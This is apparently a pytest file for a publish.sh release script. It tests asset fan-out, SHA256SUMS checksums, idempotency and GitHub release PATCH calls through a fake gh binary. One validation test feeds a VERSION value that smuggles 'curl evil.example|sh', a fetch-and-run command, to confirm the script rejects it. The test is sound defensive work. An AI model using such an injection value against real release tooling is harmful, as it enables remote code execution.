"""Filesystem tests for publish.sh assets phase (spec §7.1 fan-out + checksums).

The upload/release phases need GitHub and are exercised end-to-end against a
real tool repo; assets is pure local filesystem logic.
"""
import hashlib
import pathlib
import subprocess

REPO = pathlib.Path(__file__).resolve().parent.parent
SCRIPT = REPO / "scripts" / "publish.sh"


def make_tarball(dist: pathlib.Path, name: str, payload: bytes = b"payload") -> pathlib.Path:
    import tarfile, io, os
    dist.mkdir(parents=True, exist_ok=True)
    f = dist / name
    # real .tar.gz so sha256 over bytes is meaningful
    with tarfile.open(f, "w:gz") as tf:
        info = tarfile.TarInfo("pkg/data.bin")
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))
    return f


def sha(path: pathlib.Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def run(dist: pathlib.Path, platform_independent: bool):
    import os
    env = dict(os.environ, PLATFORM_INDEPENDENT="true" if platform_independent else "false",
               DIST=str(dist))
    env.pop("TOOL", None); env.pop("VERSION", None)   # assets phase needs neither
    return subprocess.run(["bash", str(SCRIPT), "assets"], env=env,
                          capture_output=True, text=True)


def test_assets_fans_out_noarch_to_three_platforms(tmp_path):
    dist = tmp_path / "dist"
    original = make_tarball(dist, "kickc-0.8.6-noarch.tar.gz")
    before = sha(original)
    r = run(dist, platform_independent=True)
    assert r.returncode == 0, r.stderr
    assert not (dist / "kickc-0.8.6-noarch.tar.gz").exists(), "noarch name must not ship"
    for p in ("linux-x86_64", "linux-aarch64", "macos-aarch64"):
        out = dist / f"kickc-0.8.6-{p}.tar.gz"
        assert out.exists(), f"missing {p} asset"
        assert sha(out) == before, "platform assets must be identical bytes (§7.1)"
    sums = dist / "SHA256SUMS"
    assert sums.exists()
    assert len(sums.read_text().splitlines()) == 3
    # §13 resolution: mise verifies via GitHub's API asset digest — it never
    # fetches per-asset .sha256 files, so only the human-facing SHA256SUMS ships.
    assert not list(dist.glob("*.sha256")), "per-asset .sha256 dropped (§7.1 resolved)"
    # SHA256SUMS must be verifiable with sha256sum -c
    for line in sums.read_text().splitlines():
        digest, name = line.split()
        assert digest == sha(dist / name)


def test_assets_platform_specific_keeps_names_adds_checksums(tmp_path):
    dist = tmp_path / "dist"
    make_tarball(dist, "cc65-2.19-linux-x86_64.tar.gz")
    r = run(dist, platform_independent=False)
    assert r.returncode == 0, r.stderr
    assert (dist / "cc65-2.19-linux-x86_64.tar.gz").exists()
    assert (dist / "SHA256SUMS").exists()
    # exactly one archive line
    assert len((dist / "SHA256SUMS").read_text().splitlines()) == 1


def test_assets_is_idempotent(tmp_path):
    dist = tmp_path / "dist"
    make_tarball(dist, "cc65-2.19-linux-x86_64.tar.gz")
    assert run(dist, False).returncode == 0
    assert run(dist, False).returncode == 0, "second run must not duplicate checksums"
    assert len((dist / "SHA256SUMS").read_text().splitlines()) == 1

def test_upload_and_release_reject_malformed_version_before_any_gh_call(tmp_path):
    # A crafted VERSION reaches jq programs and release ids — validate at the
    # door (security review). PATH contains only grep, so any gh invocation
    # would fail with 127; the guard must fire first with a clear error.
    import os, shutil, tempfile
    bindir = tmp_path / "bin"
    bindir.mkdir()
    (bindir / "bash").symlink_to(shutil.which("bash"))
    (bindir / "grep").symlink_to(shutil.which("grep"))
    for phase in ("upload", "release"):
        env = {
            "PATH": str(bindir),
            "GITHUB_REPOSITORY": "retropack/x",
            "VERSION": "2.19; curl evil.example|sh",
            "GH_TOKEN": "x",
            "DIST": str(tmp_path / "dist"),
        }
        r = subprocess.run(["bash", str(SCRIPT), phase], env=env,
                           capture_output=True, text=True)
        assert r.returncode == 1, f"{phase}: rc={r.returncode}, stderr={r.stderr}"
        assert "invalid version" in r.stderr, r.stderr

def test_release_patches_make_latest_not_latest(tmp_path):
    # Live E2E (run 36344364173) proved the wire bug: the Update-a-release API
    # field is `make_latest` — our `latest=` was accepted and silently IGNORED,
    # so a backfilled release stole the Latest badge. Fake-gh harness pins the
    # actual PATCH body and the draft-id/latest logic end to end.
    import os, stat, textwrap
    bindir = tmp_path / "bin"
    bindir.mkdir()
    log = tmp_path / "gh.log"
    canned = tmp_path / "releases.json"
    canned.write_text(__import__("json").dumps([
        {"id": 42, "tag_name": "v1.57.2900", "draft": True, "prerelease": False},
        {"id": 7, "tag_name": "v1.60.3243", "draft": False, "prerelease": False},
        {"id": 8, "tag_name": "v1.59.3120", "draft": False, "prerelease": False},
        {"id": 9, "tag_name": "v1.58.2974", "draft": False, "prerelease": False},
    ]))
    fake = bindir / "gh"
    fake.write_text(textwrap.dedent(f"""\
        #!/bin/sh
        printf '%s\n' "$*" >> {log}
        case "$*" in
          *PATCH*) exit 0 ;;
          *"releases?per_page=100"*--jq*) printf '42\tv1.57.2900\ttrue\n7\tv1.60.3243\tfalse\n8\tv1.59.3120\tfalse\n9\tv1.58.2974\tfalse\n' ;;
          *"releases?per_page=100"*) cat {canned}; exit 0 ;;
          *"release view"*) exit 1 ;;
          *) exit 0 ;;
        esac
        """))
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
    # bash + the tools publish.sh/fake-gh need. python3 → sys.executable:
    # PATH's python3 is a mise shim, and the sandbox HOME would break it.
    # (dirname's failure alone is non-fatal — pwd masks it — but python3/awk/
    # cat are load-bearing.)
    import shutil, sys
    for tool in ("bash", "grep", "dirname", "awk", "cat"):
        (bindir / tool).symlink_to(shutil.which(tool))
    (bindir / "python3").symlink_to(sys.executable)
    env = {"PATH": str(bindir), "GITHUB_REPOSITORY": "retropack/tass64",
           "VERSION": "1.57.2900", "GH_TOKEN": "x",
           "DIST": str(tmp_path / "dist"), "HOME": str(tmp_path)}
    r = subprocess.run(["bash", str(SCRIPT), "release"], env=env,
                       capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    calls = log.read_text()
    # draft 42 found and unpublished…
    assert "/releases/42" in calls, calls
    # …as a string-typed make_latest (boolean false is silently ignored —
    # live-verified on retropack/tass64), NOT the -F boolean form…
    assert "make_latest=false" in calls, f"wrong PATCH body:\n{calls}"
    assert "-F make_latest" not in calls, f"boolean make_latest ignored by API:\n{calls}"
    assert "-F latest=" not in calls, f"legacy ignored param sent:\n{calls}"
    # …and because an unmarked release falls back to "newest created" (always
    # the backfill), the true highest must be explicitly pinned: id 7 =
    # v1.60.3243 in the canned fixture.
    assert "/releases/7" in calls, f"highest not pinned:\n{calls}"
    assert "make_latest=true" in calls, f"highest not marked latest:\n{calls}"
